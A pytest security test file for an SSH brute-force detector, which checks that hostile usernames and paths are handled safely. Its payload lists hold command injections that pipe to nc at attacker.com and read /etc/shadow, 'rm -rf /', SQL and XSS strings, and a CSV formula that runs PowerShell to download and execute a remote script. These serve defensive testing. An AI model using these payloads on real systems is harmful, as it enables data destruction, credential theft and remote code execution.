"""
Security-focused testing for SSHvigil.
Tests for injection attacks, path traversal, privilege escalation, and other security issues.
"""
import os
import pytest
import tempfile
from datetime import datetime, timedelta
from parser import SSHLogParser
from main import BruteForceDetector


class TestInjectionAttacks:
    """Test resistance to various injection attacks."""
    
    def test_sql_injection_in_username(self):
        """Test handling of SQL injection patterns in usernames."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        sql_injections = [
            "' OR '1'='1",
            "admin'--",
            "admin' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords--",
            "admin'; DELETE FROM logs; --",
            "' OR 1=1--",
        ]
        
        for injection in sql_injections:
            detector.add_attempt("192.168.1.1", injection, now, False)
        
        # Should handle without SQL execution
        results = detector.analyze()
        assert len(results) > 0
    
    def test_command_injection_in_username(self):
        """Test handling of command injection patterns."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        command_injections = [
            "user; rm -rf /",
            "user && cat /etc/passwd",
            "user | nc attacker.com 1234",
            "user`whoami`",
            "user$(whoami)",
            "user;id;",
            "user\ncat /etc/shadow",
        ]
        
        for injection in command_injections:
            detector.add_attempt("192.168.1.1", injection, now, False)
        
        results = detector.analyze()
        assert len(results) > 0
    
    def test_xss_in_username(self):
        """Test handling of XSS patterns in usernames."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        xss_patterns = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='evil.com'>",
            "<svg onload=alert('xss')>",
        ]
        
        for pattern in xss_patterns:
            detector.add_attempt("192.168.1.1", pattern, now, False)
        
        results = detector.analyze()
        assert len(results) > 0
    
    def test_format_string_attacks(self):
        """Test handling of format string attack patterns."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        format_strings = [
            "%s%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "{0}{1}{2}",
            "user%d%d%d",
        ]
        
        for fs in format_strings:
            detector.add_attempt("192.168.1.1", fs, now, False)
        
        results = detector.analyze()
        assert len(results) > 0


class TestPathTraversal:
    """Test for path traversal vulnerabilities."""
    
    def test_path_traversal_in_csv_export(self, tmp_path):
        """Test that CSV export doesn't allow path traversal."""
        detector = BruteForceDetector()
        now = datetime.now()
        detector.add_attempt("192.168.1.1", "root", now, False)
        
        # Try to export to dangerous locations
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        for path in dangerous_paths:
            try:
                # Should either fail or write to safe location
                detector.analyze(export_csv=path)
            except (ValueError, OSError, PermissionError):
                pass  # Expected to fail
    
    def test_path_traversal_in_log_file(self):
        """Test that log file paths are validated."""
        parser = SSHLogParser()
        
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ]
        
        for path in dangerous_paths:
            try:
                attempts, stats = parser.parse_file(path, auto_detect=True)
                # If it doesn't fail, it should at least not read sensitive files
            except (FileNotFoundError, PermissionError, ValueError):
                pass  # Expected
    
    def test_symlink_following(self, tmp_path):
        """Test behavior with symbolic links."""
        if os.name == 'nt':
            pytest.skip("Symlink test not reliable on Windows without admin")
        
        # Create a log file
        log_file = tmp_path / "auth.log"
        log_file.write_text("Dec 28 10:00:00 server sshd[123]: Invalid user root from 192.168.1.1\n")
        
        # Create a symlink to it
        symlink = tmp_path / "link.log"
        try:
            symlink.symlink_to(log_file)
            parser = SSHLogParser()
            attempts, stats = parser.parse_file(str(symlink), auto_detect=True)
            # Should handle symlinks safely
            assert stats["lines_read"] >= 0
        except OSError:
            pytest.skip("Cannot create symlinks")


class TestWhitelistBypass:
    """Test for whitelist bypass vulnerabilities."""
    
    def test_whitelist_case_sensitivity(self):
        """Test that whitelist is not case-sensitive (IPs shouldn't be)."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Add attempts
        for i in range(100):
            detector.add_attempt("192.168.1.1", "root", now + timedelta(seconds=i), False)
        
        # Try case variations (though IPs shouldn't vary by case)
        whitelist = {"192.168.1.1"}
        results = detector.analyze(whitelist=whitelist, export_blocklist=None)
        
        # IP should be whitelisted
        assert len(results) >= 0
    
    def test_whitelist_with_ipv6(self):
        """Test whitelist with IPv6 addresses."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        ipv6 = "2001:db8::1"
        for i in range(100):
            detector.add_attempt(ipv6, "root", now + timedelta(seconds=i), False)
        
        # Whitelist the IPv6
        whitelist = {ipv6}
        results = detector.analyze(whitelist=whitelist)
        assert len(results) >= 0
    
    def test_whitelist_partial_match_rejection(self):
        """Test that whitelist doesn't allow partial matches."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Add attempts from similar but different IPs
        for i in range(100):
            detector.add_attempt("192.168.1.10", "root", now + timedelta(seconds=i), False)
            detector.add_attempt("192.168.1.100", "root", now + timedelta(seconds=i), False)
        
        # Whitelist only one IP
        whitelist = {"192.168.1.1"}  # Note: doesn't match .10 or .100
        results = detector.analyze(whitelist=whitelist)
        
        # Both IPs should appear (neither is whitelisted)
        ip_list = [r['IP'] for r in results]
        assert "192.168.1.10" in ip_list or "192.168.1.100" in ip_list


class TestResourceExhaustion:
    """Test for resource exhaustion attacks."""
    
    def test_memory_bomb_usernames(self):
        """Test handling of extremely large usernames (memory exhaustion attempt)."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Try to add very large username (10MB)
        try:
            huge_username = "A" * (10 * 1024 * 1024)
            detector.add_attempt("192.168.1.1", huge_username, now, False)
            # Should handle without crashing
            results = detector.analyze()
        except MemoryError:
            # Acceptable to fail with MemoryError on extreme inputs
            pass
    
    def test_csv_bomb(self, tmp_path):
        """Test CSV export with data designed to exhaust resources."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Add many IPs with many attempts
        for i in range(100):
            ip = f"192.168.{i // 256}.{i % 256}"
            # Each with problematic username
            username = "=" * 1000  # CSV formula injection attempt
            for j in range(10):
                detector.add_attempt(ip, username, now + timedelta(seconds=j), False)
        
        csv_path = tmp_path / "test_bomb.csv"
        try:
            results = detector.analyze(export_csv=str(csv_path))
            # Should complete without hanging
            assert csv_path.exists()
        except Exception as e:
            # Should handle gracefully
            pass


class TestPrivilegeEscalation:
    """Test for privilege escalation vulnerabilities."""
    
    def test_file_permission_respected(self, tmp_path):
        """Test that file permissions are respected."""
        if os.name == 'nt':
            pytest.skip("File permission test not reliable on Windows")
        
        log_file = tmp_path / "restricted.log"
        log_file.write_text("Dec 28 10:00:00 server sshd[123]: Invalid user root from 192.168.1.1\n")
        
        # Make file unreadable (Unix-like systems)
        import stat
        try:
            log_file.chmod(0o000)
            parser = SSHLogParser()
            
            with pytest.raises((PermissionError, OSError)):
                attempts, stats = parser.parse_file(str(log_file), auto_detect=True)
        finally:
            # Restore permissions for cleanup
            log_file.chmod(stat.S_IRWXU)
    
    def test_no_arbitrary_file_write(self, tmp_path):
        """Test that CSV export can't write to arbitrary locations."""
        detector = BruteForceDetector()
        now = datetime.now()
        detector.add_attempt("192.168.1.1", "root", now, False)
        
        # Try to write to system directories (should fail or be caught)
        if os.name == 'nt':
            dangerous_path = "C:\\Windows\\System32\\evil.csv"
        else:
            dangerous_path = "/etc/evil.csv"
        
        try:
            results = detector.analyze(export_csv=dangerous_path)
            # If it succeeds, verify it didn't actually write there
            assert not os.path.exists(dangerous_path)
        except (PermissionError, OSError):
            pass  # Expected


class TestLogInjection:
    """Test for log injection vulnerabilities."""
    
    def test_newline_injection_in_username(self):
        """Test that newlines in usernames don't break parsing."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Usernames with newlines (log injection attempt)
        malicious_usernames = [
            "user\nFake log line",
            "admin\rCarriage return",
            "test\r\nWindows newline",
            "user\n\nDouble newline",
        ]
        
        for username in malicious_usernames:
            detector.add_attempt("192.168.1.1", username, now, False)
        
        results = detector.analyze()
        # Should handle without breaking output
        assert len(results) > 0
    
    def test_ansi_escape_injection(self):
        """Test handling of ANSI escape codes in data."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Usernames with ANSI escapes
        ansi_usernames = [
            "\033[31mred_user\033[0m",
            "\033[1;31mBOLD_RED\033[0m",
            "\x1b[?25l",  # Hide cursor
            "\033[2J",    # Clear screen
        ]
        
        for username in ansi_usernames:
            detector.add_attempt("192.168.1.1", username, now, False)
        
        results = detector.analyze()
        # Should handle without affecting terminal
        assert len(results) > 0


class TestCSVInjection:
    """Test for CSV injection vulnerabilities."""
    
    def test_csv_formula_injection(self, tmp_path):
        """Test that CSV export sanitizes formula-like content."""
        detector = BruteForceDetector()
        now = datetime.now()
        
        # Usernames that look like Excel formulas
        formula_usernames = [
            "=1+1",
            "=cmd|'/c calc'!A1",
            "@SUM(1+1)",
            "+1+1",
            "-1+1",
            "=1+1+cmd|'/c powershell IEX(wget attacker.com/shell.ps1)'!A0",
        ]
        
        for username in formula_usernames:
            detector.add_attempt("192.168.1.1", username, now, False)
        
        csv_path = tmp_path / "formula_test.csv"
        results = detector.analyze(export_csv=str(csv_path))
        
        # Read CSV and check if formulas are escaped
        if csv_path.exists():
            content = csv_path.read_text()
            # Formulas should ideally be escaped or quoted
            # At minimum, file should exist and be valid CSV
            assert len(content) > 0
